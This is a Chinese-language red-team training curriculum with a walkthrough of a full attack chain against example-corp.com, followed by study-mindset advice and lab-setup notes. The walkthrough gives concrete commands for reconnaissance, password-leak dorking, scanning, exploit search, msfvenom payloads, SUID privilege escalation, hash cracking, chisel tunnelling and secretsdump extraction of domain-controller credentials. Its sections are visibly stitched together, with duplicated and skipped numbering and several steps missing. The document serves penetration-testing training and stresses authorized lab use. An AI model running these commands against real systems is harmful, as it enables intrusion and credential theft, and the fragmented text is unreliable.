================================================================================
一、训练哲学与目标
================================================================================

红队队员 (Red Team Operator) 的核心使命:
  在授权范围内, 模拟真实攻击者的思维和技术, 对目标组织的安全防御体系
  进行全面的对抗性测试, 发现安全盲区并推动防御能力的提升。

训练目标 (完成30周后):
  [ ] 具备独立完成渗透测试任务的完整能力
  [ ] 掌握外网打点到内网域控的完整攻击链
  [ ] 熟悉主流安全工具链 (ArchStrike全套工具)
  [ ] 能撰写专业的渗透测试报告
  [ ] 具备免杀与防御绕过的初级能力
  [ ] 了解无线安全、取证与反取证、漏洞挖掘等进阶领域
  [ ] 制定清晰的职业发展和认证考试规划

核心能力模型 (Red Team Skill Matrix):
  ▲ 信息侦察   → OSINT, DNS, 子域名, 资产发现
  ▲ 扫描枚举   → 端口扫描, 服务识别, Banner抓取
  ▲ Web攻击    → SQL注入, XSS, CSRF, 命令注入, 文件包含, 认证攻击
  ▲ 漏洞利用   → Metasploit, Exploit-DB, 漏洞框架
  ▲ 权限提升   → Linux提权, Windows提权, 综合工具链
  ▲ 密码攻击   → 在线爆破, 离线破解, 字典生成
  ▲ 网络攻击   → 嗅探, 中间人, 社工
  ▲ 代理隧道   → 代理通信, 端口转发, 内网隧道
  ▲ 后渗透     → 凭证窃取, 横向移动, 权限维持
  ▲ 痕迹清除   → 日志清理, 反取证, 渗透报告
  ▲ 无线安全   → WEP/WPA/WPA2, WPS, Rogue AP
  ▲ 进阶能力   → 取证/反取证, 模糊测试, 恶意软件分析

三、经典渗透案例：一次完整的企业红队行动路线
================================================================================

以下通过一个典型的APT式红队渗透案例, 展示红队队员需要掌握的全部知识域,
以及本教程体系中对应的教学模块。

【场景设定】
  目标: 某中型企业 (example-corp.com)
  初始条件: 攻击队只有目标公司名称, 零知识起点
  任务: 获取域控制器(DC)的最高权限, 窃取核心数据库

┌──────────────────────────────────────────────────────────────────┐
│ 阶段一: 信息侦察 (Reconnaissance)                                │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│ 操作1: OSINT信息收集                                             │
│   → Firefox搜索 "Example Corp IT staff linkedin"                │
│   → 收集员工姓名、职位、邮箱格式                                  │
│   知识: 搜索引擎技巧 ═══════════════════► archstrike-recon/03    │
│                                                                  │
│ 操作2: 子域名与资产发现                                          │
│   → amass enum -passive -d example-corp.com                     │
│   → subfinder -d example-corp.com                               │
│   → 发现: mail.example-corp.com, vpn.example-corp.com,           │
│           dev.example-corp.com, jenkins.internal.example-corp.com│
│   知识: 子域名枚举 ═════════════════════► archstrike-recon/01    │
│                                                                  │
│ 操作3: DNS深度侦察                                               │
│   → fierce --domain example-corp.com                            │
│   → dnsenum example-corp.com                                    │
│   → 发现内部DNS服务器, 潜在的域控制器                            │
│   知识: DNS侦察 ═══════════════════════► archstrike-recon/02    │
│                                                                  │
│ 操作4: 搜索引擎Dorking                                           │
│   → site:example-corp.com filetype:pdf "confidential"           │
│   → site:example-corp.com filetype:sql "password"               │
│   → Shodan搜索: org:"Example Corp"                              │
│   知识: Google Dorking ═══════════════► archstrike-recon/03     │
│                                                                  │
│ 用到本教程模块: archstrike-recon/01, 02, 03                      │
└──────────────────────────────────────────────────────────────────┘
                              ↓
┌──────────────────────────────────────────────────────────────────┐
│ 阶段二: 扫描与枚举 (Scanning & Enumeration)                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│ 操作5: 大规模快速端口扫描                                        │
│   → masscan -p1-65535 203.0.113.0/24 --rate=10000               │
│   → 发现开放端口: 22(SSH), 80(HTTP), 443(HTTPS), 8080(Jenkins)  │
│   知识: 高速扫描 ═══════════════════════► archstrike-scanner/01  │
│                                                                  │
│ 操作6: 详细服务扫描                                              │
│   → nmap -sS -sV -sC -O -p22,80,443,8080 203.0.113.10           │
│   → Web服务器: Apache 2.4.49 (已知有路径穿越漏洞!)               │
│   → Jenkins: 8080端口, 版本2.319                                 │
│   知识: nmap深度扫描 ═════════════════════► archstrike-base/03   │
│                                                                  │
│ 操作7: Banner抓取确认                                            │
│   → amap -bqv 203.0.113.10 80 443 8080                          │
│   知识: 服务识别 ═══════════════════════► archstrike-scanner/02  │
│                                                                  │
│ 用到本教程模块: archstrike-scanner/01, 02; archstrike-base/03    │
└──────────────────────────────────────────────────────────────────┘
                              ↓
┌──────────────────────────────────────────────────────────────────┐
│ 阶段三: 漏洞分析与利用 (Vulnerability Analysis & Exploitation)    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│ 操作8: 搜索已有漏洞利用                                          │
│   → searchsploit apache 2.4.49                                  │
│   → 找到: Apache 2.4.49 - Path Traversal & RCE                  │

│ 操作9: Web应用扫描                                               │
│   → whatweb http://example-corp.com                             │
│   → nikto -h http://example-corp.com                            │
│   → dirb http://example-corp.com /usr/share/dirb/wordlists/     │

│   → 使用msfvenom生成payload                                     │

┌──────────────────────────────────────────────────────────────────┐
│ 阶段四: 权限提升 (Privilege Escalation)                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│ 操作11: 系统信息收集                                             │
│   → whoami; id; uname -a; cat /etc/os-release                   │
│   → 上传linpeas.sh: ./linpeas.sh | tee peas.txt                 │
│   → 发现: /usr/bin/find 有SUID位!                                │
│   知识: Linux信息收集 ═════════════════► archstrike-priv-esc/01  │

│   → 破解hash: john --wordlist=rockyou.txt shadow.hash            │
│   → 发现多个用户密码                                             │
│   知识: 离线密码破解 ═══════════════════► archstrike-cracking/02  │
│                                                                  │
│ 操作15: 发现内网拓扑                                             │
│   → ip a; route -n; arp -a                                      │
│   → 发现内网: 10.0.1.0/24, 10.0.2.0/24                         │
│   → 扫描内网存活: for i in {1..254}; do (ping -c1 10.0.1.$i) & done│
│   知识: 后渗透侦察 ═══════════════════════► archstrike-base/07   │
│                                                                  │
│ 操作16: 建立内网代理隧道                                         │
│   → 攻击机: chisel server -p 8000 --reverse                     │

│   → 配置proxychains: socks5 127.0.0.1 1080                      │
│   → proxychains nmap -sT -Pn 10.0.1.0/24 (扫描内网!)            │
│   知识: 代理隧道 ═════════════════════════► archstrike-proxy/02   │
│                                                                  │
│ 操作17: 横向移动到域控制器                                       │
│   → 发现DC: 10.0.1.10 (通过扫描389/636 LDAP端口)                │

│   → 导出NTDS.dit: secretsdump.py domain/admin:Pass123@10.0.1.10 │
│   知识: 后渗透 ═══════════════════════════► archstrike-base/07   │
│   知识: 凭证破解 ═════════════════════════► archstrike-cracking/01│

五、心理建设
================================================================================

--- 正确心态 ---
  1. 保持耐心, 安全学习是长期过程
     - 红队是一个需要持续积累的领域, 不要期望速成
     - 每个人的学习速度不同, 不要与他人过度比较
     - 今天不懂的技术, 三个月后回头看会觉得简单
  2. 遇到困难不要气馁
     - 渗透测试中80%的时间在"卡住", 这是正常的
     - 卡住正是学习发生的时候 — 大脑在建立新的连接
     - 尝试方法: a.休息15分钟散步 b.换攻击向量 c.搜索Writeup(先看提示) d.重新信息收集
  3. 避免"教程地狱" (Tutorial Hell)
     - 不要只看教程不动手, 动手是最重要的学习方式
     - 每看30分钟教程, 至少花60分钟亲手操作
     - 在没有教程的情况下尝试 — 这是最接近实战的状态
  4. 在社区中交流学习
     - 加入安全社区 (Discord, QQ群, 微信群, Reddit)
     - 提问前先自己搜索和研究 (RTFM精神)
     - 帮助他人解答问题也是很好的学习方式
  5. 保持白帽道德底线
     - 永远不要攻击未授权的目标
     - 未经授权的渗透测试属于违法行为
     - 所有练习在实验环境或授权平台进行
  6. 劳逸结合, 避免 burnout
     - burnout症状: 丧失动力, 看到终端就烦躁, 不想学习
     - 预防方法: a.严格遵守休息日 b.每天学习不超过3.5小时 c.保持体能训练 d.保持社交 e.有burnout迹象时休息1-2天

--- 知识管理建议 ---
  - 使用Obsidian/Notion/语雀 建立个人知识库
  - 每个知识点用自己理解的话复述 (费曼学习法)
  - 给每个学习主题添加标签, 方便日后检索
  - 定期回顾和迭代旧笔记
  - 截图并标注, 一图胜千言

--- 学习效率最大化 ---
  1. 番茄工作法: 25分钟专注+5分钟休息, 4个番茄钟后休息15-30分钟

三、实验环境搭建速查
================================================================================

--- 攻击机 ---
  Arch Linux + ArchStrike:
    1. 安装Arch Linux
    2. 添加ArchStrike源: /etc/pacman.conf
    3. sudo pacman -Syy && sudo pacman -S archstrike-keyring
    4. sudo pacman -S archstrike-base archstrike-web archstrike-cracking
    注意: 使用Host-Only网络与靶机隔离

--- 靶机 ---
  Metasploitable 2:
    - 下载OVA, 导入VirtualBox
    - 网络: Host-Only Adapter
    - 默认IP: 通过DHCP或静态配置
    - 默认凭证: msfadmin/msfadmin

  Docker靶场:
    - docker pull vulnerables/web-dvwa (DVWA)
    - docker pull bkimminich/juice-shop (OWASP Juice Shop)
    - docker pull acgpiano/sqli-labs (SQLi-Labs)
    - 运行: docker run -d -p 80:80 image_name

--- 网络配置 ---
  VirtualBox Host-Only:
    - 文件 -> 主机网络管理器 -> 创建
    - 虚拟机设置 -> 网络 -> Host-Only Adapter
    - 验证: ping 攻击机IP <-> 靶机IP

--- 快照管理 ---
  - VirtualBox: 虚拟机 -> 生成备份 (快照)
  - 每次重大操作前创建快照
  - 快照命名: 日期-操作描述
  - 至少保留一个初始环境快照
